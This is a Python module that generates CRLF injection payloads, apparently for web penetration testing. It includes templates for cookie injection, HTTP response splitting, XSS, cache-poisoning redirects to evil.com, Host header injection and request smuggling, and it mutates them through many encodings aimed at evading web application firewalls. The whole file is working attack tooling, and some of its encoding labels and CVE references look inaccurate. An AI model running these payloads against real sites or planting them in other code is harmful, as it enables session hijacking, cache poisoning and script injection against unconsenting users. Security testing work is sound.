"""
Advanced CRLF Injection Payloads with Mutations and Encoding Variants
Professional-grade payload generator for penetration testing
"""

import urllib.parse
import base64
import random
import string
from typing import List, Dict, Generator, Callable
from dataclasses import dataclass
from enum import Enum


class EncodingType(Enum):
    """Types of encoding to apply"""
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    UTF8 = "utf8"
    UNICODE = "unicode"
    HEX = "hex"
    BASE64 = "base64"
    MIXED = "mixed"


class InjectionVector(Enum):
    """Where to inject the payload"""
    QUERY_PARAM = "query_param"
    HEADER = "header"
    POST_BODY = "post_body"
    COOKIE = "cookie"
    PATH = "path"
    FRAGMENT = "fragment"
    HTTP_VERSION = "http_version"
    METHOD = "method"


@dataclass
class PayloadTemplate:
    """Template for generating CRLF injection payloads"""
    name: str
    template: str
    vectors: List[InjectionVector]
    description: str
    severity: str  # "critical", "high", "medium", "low"
    cve_references: List[str]
    tags: List[str]


# Core CRLF injection templates
CORE_TEMPLATES = [
    PayloadTemplate(
        name="basic_crlf_header_injection",
        template="{crlf}Set-Cookie:{marker}=injected",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER, InjectionVector.POST_BODY, InjectionVector.COOKIE],
        description="Basic CRLF injection to set arbitrary cookie",
        severity="high",
        cve_references=["CVE-2019-11043", "CVE-2018-14041"],
        tags=["crlf", "cookie-injection", "header-injection"]
    ),
    PayloadTemplate(
        name="response_splitting",
        template="{crlf}{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}{crlf}{marker}-SPLIT-BODY",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER, InjectionVector.POST_BODY],
        description="Full HTTP response splitting with injected body",
        severity="critical",
        cve_references=["CVE-2017-16608", "CVE-2016-7989"],
        tags=["response-splitting", "cache-poisoning", "critical"]
    ),
    PayloadTemplate(
        name="cache_poisoning_redirect",
        template="{crlf}Location: https://evil.com/{marker}{crlf}{crlf}",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER],
        description="Cache poisoning via Location header injection",
        severity="critical",
        cve_references=["CVE-2017-15088"],
        tags=["cache-poisoning", "redirect", "critical"]
    ),
    PayloadTemplate(
        name="xss_via_response_splitting",
        template="{crlf}{crlf}<script>alert('{marker}')</script>",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER],
        description="XSS via response splitting - injects script in response body",
        severity="high",
        cve_references=[],
        tags=["xss", "response-splitting"]
    ),
    PayloadTemplate(
        name="header_injection_multiple",
        template="{crlf}X-Injected: {marker}{crlf}X-Forwarded-For: 127.0.0.1{crlf}Set-Cookie: session={marker}",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER],
        description="Multiple header injection in single payload",
        severity="high",
        cve_references=[],
        tags=["multi-header", "header-injection"]
    ),
    PayloadTemplate(
        name="http_request_smuggling_cl_te",
        template="{crlf}Transfer-Encoding: chunked{crlf}Content-Length: 0{crlf}{crlf}",
        vectors=[InjectionVector.HEADER],
        description="CL.TE request smuggling via header injection",
        severity="critical",
        cve_references=["CVE-2019-11043"],
        tags=["request-smuggling", "cl-te", "critical"]
    ),
    PayloadTemplate(
        name="host_header_injection",
        template="{crlf}Host: evil.com",
        vectors=[InjectionVector.HEADER],
        description="Host header injection for cache poisoning/SSRF",
        severity="high",
        cve_references=[],
        tags=["host-header", "cache-poisoning", "ssrf"]
    ),
    PayloadTemplate(
        name="cookie_bomb",
        template="{crlf}Set-Cookie: {marker}=A; Path=/{crlf}Set-Cookie: {marker}=B; Path=/admin{crlf}Set-Cookie: {marker}=C; Path=/api",
        vectors=[InjectionVector.QUERY_PARAM, InjectionVector.HEADER, InjectionVector.POST_BODY],
        description="Multiple cookie injection (cookie bomb)",
        severity="medium",
        cve_references=[],
        tags=["cookie-bomb", "multi-cookie"]
    ),
    PayloadTemplate(
        name="content_length_manipulation",
        template="{crlf}Content-Length: 9999{crlf}{crlf}",
        vectors=[InjectionVector.HEADER, InjectionVector.POST_BODY],
        description="Content-Length manipulation for request smuggling",
        severity="high",
        cve_references=[],
        tags=["request-smuggling", "content-length"]
    ),
    PayloadTemplate(
        name="transfer_encoding_chunked",
        template="{crlf}Transfer-Encoding: chunked{crlf}{crlf}0{crlf}{crlf}",
        vectors=[InjectionVector.HEADER, InjectionVector.POST_BODY],
        description="Transfer-Encoding chunked injection",
        severity="high",
        cve_references=[],
        tags=["request-smuggling", "chunked"]
    ),
]


# CRLF sequence variations
CRLF_VARIANTS = {
    EncodingType.NONE: [
        "\r\n",
        "\n\r",
        "\n",
        "\r",
    ],
    EncodingType.URL: [
        "%0d%0a",
        "%0D%0A",
        "%0d%0A",
        "%0D%0a",
        "%0a%0d",
        "%0A%0D",
        "%0a",
        "%0d",
    ],
    EncodingType.DOUBLE_URL: [
        "%250d%250a",
        "%250D%250A",
        "%250d%250A",
        "%250D%250a",
    ],
    EncodingType.UTF8: [
        "%E5%98%8A%E5%98%8D",  # UTF-8 encoded \r\n
        "%E5%98%8D%E5%98%8A",  # UTF-8 encoded \n\r
        "%C2%8A%C2%8D",       # Overlong UTF-8
    ],
    EncodingType.UNICODE: [
        "\u000d\u000a",
        "\u000a\u000d",
        "\uff0d\uff0a",       # Fullwidth
        "\u2028\u2029",       # Line/Paragraph separator
    ],
    EncodingType.HEX: [
        "\\x0d\\x0a",
        "\\x0a\\x0d",
        "0x0d0x0a",
    ],
    EncodingType.BASE64: [
        lambda s: base64.b64encode(s.encode()).decode(),
    ],
}


def generate_marker(prefix: str = "crlfhunter") -> str:
    """Generate unique marker for detection"""
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{suffix}"


def apply_encoding(crlf: str, encoding: EncodingType) -> List[str]:
    """Apply encoding to CRLF sequence"""
    variants = CRLF_VARIANTS.get(encoding, [crlf])
    results = []
    for v in variants:
        if callable(v):
            results.append(v(crlf))
        else:
            results.append(v)
    return results


def mutate_payload(payload: str, mutation_level: int = 1) -> Generator[str, None, None]:
    """Apply mutations to payload for WAF evasion"""
    mutations = [
        # Case variations
        lambda p: p.upper(),
        lambda p: p.lower(),
        lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
        
        # Whitespace variations
        lambda p: p.replace("\r\n", "\r\n "),
        lambda p: p.replace("\r\n", " \r\n"),
        lambda p: p.replace("\r\n", "\t\r\n"),
        
        # URL encoding variations
        lambda p: urllib.parse.quote(p, safe=''),
        lambda p: urllib.parse.quote(p, safe='').replace("%0D%0A", "%0d%0a"),
        lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe=''),
        
        # Unicode normalization
        lambda p: p.replace("\r", "\u000d").replace("\n", "\u000a"),
        lambda p: p.replace("\r\n", "\u2028\u2029"),
        
        # Overlong UTF-8
        lambda p: p.replace("\r", "%C0%8D").replace("\n", "%C0%8A"),
        
        # Mixed encoding
        lambda p: ''.join(
            f"%{ord(c):02x}" if c in '\r\n' else c for c in p
        ),
        
        # Null byte injection
        lambda p: p.replace("\r\n", "\r\n%00"),
        lambda p: p.replace("\r\n", "%00\r\n"),
        
        # Tab/space obfuscation
        lambda p: p.replace(":", "\t:"),
        lambda p: p.replace(":", " :"),
        lambda p: p.replace("Set-Cookie", "Set-\tCookie"),
        lambda p: p.replace("Location", "Loc\tation"),
    ]
    
    if mutation_level >= 1:
        for mut in mutations[:5]:
            yield mut(payload)
    if mutation_level >= 2:
        for mut in mutations[5:10]:
            yield mut(payload)
    if mutation_level >= 3:
        for mut in mutations[10:]:
            yield mut(payload)
    
    # Combined mutations
    if mutation_level >= 2:
        yield urllib.parse.quote(payload.upper(), safe='')
        yield urllib.parse.quote(payload.lower(), safe='')
        yield urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')


class AdvancedPayloadGenerator:
    """Professional-grade CRLF injection payload generator"""
    
    def __init__(self, marker: str = None, mutation_level: int = 2):
        self.marker = marker or generate_marker()
        self.mutation_level = mutation_level
        self.templates = CORE_TEMPLATES[:]
        self.custom_templates: List[PayloadTemplate] = []
    
    def add_template(self, template: PayloadTemplate):
        """Add custom payload template"""
        self.custom_templates.append(template)
    
    def get_all_templates(self) -> List[PayloadTemplate]:
        """Get all templates including custom"""
        return self.templates + self.custom_templates
    
    def generate_for_vector(self, vector: InjectionVector, 
                            encodings: List[EncodingType] = None) -> List[Dict]:
        """Generate all payloads for a specific injection vector"""
        if encodings is None:
            encodings = [EncodingType.NONE, EncodingType.URL, EncodingType.DOUBLE_URL, 
                        EncodingType.UTF8, EncodingType.UNICODE]
        
        payloads = []
        for template in self.get_all_templates():
            if vector not in template.vectors:
                continue
            
            for encoding in encodings:
                for crlf_variant in apply_encoding("\r\n", encoding):
                    # Replace placeholders
                    payload = template.template.replace("{crlf}", crlf_variant).replace("{marker}", self.marker)
                    
                    # Apply mutations
                    mutated = list(mutate_payload(payload, self.mutation_level))
                    mutated.insert(0, payload)  # Original first
                    
                    for i, mut_payload in enumerate(mutated):
                        payloads.append({
                            "template_name": template.name,
                            "template": template,
                            "encoding": encoding.value,
                            "crlf_variant": crlf_variant,
                            "mutation": i,
                            "payload": mut_payload,
                            "vector": vector.value,
                            "severity": template.severity,
                            "tags": template.tags,
                            "description": template.description,
                        })
        
        return payloads
    
    def generate_all(self, vectors: List[InjectionVector] = None,
                     encodings: List[EncodingType] = None) -> List[Dict]:
        """Generate payloads for all vectors"""
        if vectors is None:
            vectors = list(InjectionVector)
        
        all_payloads = []
        for vector in vectors:
            all_payloads.extend(self.generate_for_vector(vector, encodings))
        return all_payloads
    
    def get_payloads_by_severity(self, severity: str) -> List[Dict]:
        """Filter payloads by severity"""
        all_payloads = self.generate_all()
        return [p for p in all_payloads if p["severity"] == severity]
    
    def get_payloads_by_tag(self, tag: str) -> List[Dict]:
        """Filter payloads by tag"""
        all_payloads = self.generate_all()
        return [p for p in all_payloads if tag in p["tags"]]


# Pre-built payload sets for common scenarios
def get_quick_scan_payloads(marker: str = None) -> List[str]:
    """Quick scan - minimal payload set for fast testing"""
    gen = AdvancedPayloadGenerator(marker, mutation_level=0)
    payloads = gen.generate_for_vector(InjectionVector.QUERY_PARAM, [EncodingType.URL])
    return [p["payload"] for p in payloads[:20]]  # Top 20


def get_standard_scan_payloads(marker: str = None) -> List[str]:
    """Standard scan - balanced payload set"""
    gen = AdvancedPayloadGenerator(marker, mutation_level=1)
    vectors = [InjectionVector.QUERY_PARAM, InjectionVector.HEADER, InjectionVector.POST_BODY]
    encodings = [EncodingType.NONE, EncodingType.URL, EncodingType.DOUBLE_URL, EncodingType.UTF8]
    payloads = []
    for v in vectors:
        payloads.extend(gen.generate_for_vector(v, encodings))
    return [p["payload"] for p in payloads]


def get_deep_scan_payloads(marker: str = None) -> List[str]:
    """Deep scan - comprehensive payload set with all mutations"""
    gen = AdvancedPayloadGenerator(marker, mutation_level=3)
    return [p["payload"] for p in gen.generate_all()]


def get_waf_evasion_payloads(marker: str = None) -> List[str]:
    """WAF evasion focused payloads"""
    gen = AdvancedPayloadGenerator(marker, mutation_level=3)
    # Focus on heavily mutated payloads
    all_payloads = gen.generate_all()
    waf_payloads = []
    for p in all_payloads:
        if p["mutation"] > 0 or p["encoding"] in ["double_url", "utf8", "unicode", "mixed"]:
            waf_payloads.append(p["payload"])
    return waf_payloads


def get_cve_specific_payloads(marker: str = None) -> List[Dict]:
    """Payloads targeting specific CVEs"""
    gen = AdvancedPayloadGenerator(marker, mutation_level=1)
    all_payloads = gen.generate_all()
    cve_payloads = {}
    for p in all_payloads:
        for cve in p["template"].cve_references:
            if cve not in cve_payloads:
                cve_payloads[cve] = []
            cve_payloads[cve].append(p)
    return cve_payloads


# Backward compatibility
MARKER = "crlfhunter_poc"

PAYLOADS = [
    "%0d%0aSet-Cookie:{marker}=1",
    "%0D%0ASet-Cookie:{marker}=1",
    "\r\nSet-Cookie:{marker}=1",
    "%0d%0a%0d%0a{marker}-BODY-SPLIT",
    "%E5%98%8A%E5%98%8DSet-Cookie:{marker}=1",
    "%250d%250aSet-Cookie:{marker}=1",
    "%0d%0aLocation:https://evil.example/{marker}",
]

def get_payloads():
    """Return payloads with marker substituted (legacy)"""
    return [p.format(marker=MARKER) for p in PAYLOADS]

def get_marker():
    """Return the marker string used for detection (legacy)"""
    return MARKER